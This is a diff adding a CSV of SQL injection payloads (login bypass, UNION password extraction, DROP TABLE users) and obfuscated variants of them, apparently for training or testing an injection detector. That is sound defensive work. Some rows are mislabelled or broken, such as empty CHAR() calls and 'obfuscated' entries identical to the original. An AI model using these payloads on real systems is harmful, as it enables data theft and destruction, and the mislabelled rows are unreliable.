@@ -1,0 +1,82 @@
+variant_id,original_payload,obfuscated_payload,technique,intensity,Label
+OBF_00000,' OR 1=1--,' °R 1=1--,leet_speak,low,1
+OBF_00001,' OR 1=1--,' 0R 1=1--,leet_speak,medium,1
+OBF_00002,' OR 1=1--,' ØR 1=1--,leet_speak,high,1
+OBF_00003,' OR 1=1--,' ＯR 1=1--,homoglyph,low,1
+OBF_00004,' OR 1=1--,' ΟR 1=1--,homoglyph,medium,1
+OBF_00005,' OR 1=1--,' ΟƦ 1=1--,homoglyph,high,1
+OBF_00006,' OR 1=1--,' O/**/R 1=1--,comment_insertion,medium,1
+OBF_00007,' OR 1=1--,CHAR() OR 1=1--,concatenation,high,1
+OBF_00008,' OR 1=1--,%2527%2520OR%25201%253D1--,double_encoding,high,1
+OBF_00009,admin'--,Λdmin'--,leet_speak,low,1
+OBF_00010,admin'--,4dmin'--,leet_speak,medium,1
+OBF_00011,admin'--,@dm|n'--,leet_speak,high,1
+OBF_00012,admin'--,Ａdmin'--,homoglyph,low,1
+OBF_00013,admin'--,Ａdmin'--,homoglyph,medium,1
+OBF_00014,admin'--,ＡdmІn'--,homoglyph,high,1
+OBF_00015,admin'--,admin'--,comment_insertion,medium,1
+OBF_00016,admin'--,"CHAR(97,100,109,105,110,39,45,45)",concatenation,high,1
+OBF_00017,admin'--,admin%2527--,double_encoding,high,1
+OBF_00018,' UNION SELECT NULL--,' ƱN1ON SELECT NULL--,leet_speak,low,1
+OBF_00019,' UNION SELECT NULL--,' ƱN10N §€LECT NULL--,leet_speak,medium,1
+OBF_00020,' UNION SELECT NULL--,' ÜN|°N $€1€C7 NÜŁ1--,leet_speak,high,1
+OBF_00021,' UNION SELECT NULL--,' ＵNION SELECT NULL--,homoglyph,low,1
+OBF_00022,' UNION SELECT NULL--,' υNΙΟN ＳELECT NULL--,homoglyph,medium,1
+OBF_00023,' UNION SELECT NULL--,' ＵNＩΟN ЅЕLΕСТ NυLL--,homoglyph,high,1
+OBF_00024,' UNION SELECT NULL--,' UN/**/ION SEL/**/ECT NULL--,comment_insertion,medium,1
+OBF_00025,' UNION SELECT NULL--,CHAR() UNION SELECT NULL--,concatenation,high,1
+OBF_00026,' UNION SELECT NULL--,%2527%2520UNION%2520SELECT%2520NULL--,double_encoding,high,1
+OBF_00027,1' AND '1'='1,1' 4ND '1'='1,leet_speak,low,1
+OBF_00028,1' AND '1'='1,1' ΛND '1'='1,leet_speak,medium,1
+OBF_00029,1' AND '1'='1,1' @ND '1'='1,leet_speak,high,1
+OBF_00030,1' AND '1'='1,1' ΑND '1'='1,homoglyph,low,1
+OBF_00031,1' AND '1'='1,1' ＡND '1'='1,homoglyph,medium,1
+OBF_00032,1' AND '1'='1,1' ΑND '1'='1,homoglyph,high,1
+OBF_00033,1' AND '1'='1,1' A/**/ND '1'='1,comment_insertion,medium,1
+OBF_00034,1' AND '1'='1,CHAR(49) AND '1'='1,concatenation,high,1
+OBF_00035,1' AND '1'='1,1%2527%2520AND%2520%25271%2527%253D%25271,double_encoding,high,1
+OBF_00036,'; DROP TABLE users--,'; DR°P †ABLE users--,leet_speak,low,1
+OBF_00037,'; DROP TABLE users--,'; DR°P +Λ฿|_E users--,leet_speak,medium,1
+OBF_00038,'; DROP TABLE users--,'; DRØP †Λß|ΣEμ5Σe5s--,leet_speak,high,1
+OBF_00039,'; DROP TABLE users--,'; DƦＯP TABLE users--,homoglyph,low,1
+OBF_00040,'; DROP TABLE users--,'; DƦΟΡ ΤАВLE users--,homoglyph,medium,1
+OBF_00041,'; DROP TABLE users--,'; DＲОР ＴΑＢLΕ υŞＥГＳ--,homoglyph,high,1
+OBF_00042,'; DROP TABLE users--,'; DROP TABLE users--,comment_insertion,medium,1
+OBF_00043,'; DROP TABLE users--,CHAR(59) DROP TABLE users--,concatenation,high,1
+OBF_00044,'; DROP TABLE users--,%2527%253B%2520DROP%2520TABLE%2520users--,double_encoding,high,1
+OBF_00045,SELECT * FROM users,$ΣLECT * FROM users,leet_speak,low,1
+OBF_00046,SELECT * FROM users,§Σ|€E+T * FROM users,leet_speak,medium,1
+OBF_00047,SELECT * FROM users,§313C† * FR°M μ5Σr5,leet_speak,high,1
+OBF_00048,SELECT * FROM users,ŞЕLECT * FROM users,homoglyph,low,1
+OBF_00049,SELECT * FROM users,ŞЕLΕＣＴ * FГOM users,homoglyph,medium,1
+OBF_00050,SELECT * FROM users,ЅΕLЕϹＴ * FƦΟM ＵŞЕＲЅ,homoglyph,high,1
+OBF_00051,SELECT * FROM users,SEL/**/ECT * FR/**/OM users,comment_insertion,medium,1
+OBF_00052,SELECT * FROM users,"CHAR(83,69,76,69,67,84) * FROM users",concatenation,high,1
+OBF_00053,SELECT * FROM users,SELECT%2520%252A%2520FROM%2520users,double_encoding,high,1
+OBF_00054,OR 1=1,°R 1=1,leet_speak,low,1
+OBF_00055,OR 1=1,ØR 1=1,leet_speak,medium,1
+OBF_00056,OR 1=1,ØR 1=1,leet_speak,high,1
+OBF_00057,OR 1=1,ΟR 1=1,homoglyph,low,1
+OBF_00058,OR 1=1,ОR 1=1,homoglyph,medium,1
+OBF_00059,OR 1=1,ОƦ 1=1,homoglyph,high,1
+OBF_00060,OR 1=1,O/**/R 1=1,comment_insertion,medium,1
+OBF_00061,OR 1=1,"CHAR(79,82) 1=1",concatenation,high,1
+OBF_00062,OR 1=1,OR%25201%253D1,double_encoding,high,1
+OBF_00063,UNION SELECT password,μN1ON SELECT password,leet_speak,low,1
+OBF_00064,UNION SELECT password,μN!ØN 53ŁECT password,leet_speak,medium,1
+OBF_00065,UNION SELECT password,ƱN|°N 5€Ł€C+ pΛ§$wØrd,leet_speak,high,1
+OBF_00066,UNION SELECT password,υNІON SELECT password,homoglyph,low,1
+OBF_00067,UNION SELECT password,ՍNІＯN ŞЕLＥＣT password,homoglyph,medium,1
+OBF_00068,UNION SELECT password,ՍNＩΟN ŞЕLＥϹＴ ΡАЅŞwＯƦd,homoglyph,high,1
+OBF_00069,UNION SELECT password,UN/**/ION SEL/**/ECT passwO/**/Rd,comment_insertion,medium,1
+OBF_00070,UNION SELECT password,"CHAR(85,78,73,79,78) SELECT password",concatenation,high,1
+OBF_00071,UNION SELECT password,UNION%2520SELECT%2520password,double_encoding,high,1
+OBF_00072,AND admin=1,ΛND admin=1,leet_speak,low,1
+OBF_00073,AND admin=1,4ND admin=1,leet_speak,medium,1
+OBF_00074,AND admin=1,4ND @dm|n=1,leet_speak,high,1
+OBF_00075,AND admin=1,АND admin=1,homoglyph,low,1
+OBF_00076,AND admin=1,АND admin=1,homoglyph,medium,1
+OBF_00077,AND admin=1,ΑND ＡdmІn=1,homoglyph,high,1
+OBF_00078,AND admin=1,A/**/ND admin=1,comment_insertion,medium,1
+OBF_00079,AND admin=1,"CHAR(65,78,68) admin=1",concatenation,high,1
+OBF_00080,AND admin=1,AND%2520admin%253D1,double_encoding,high,1
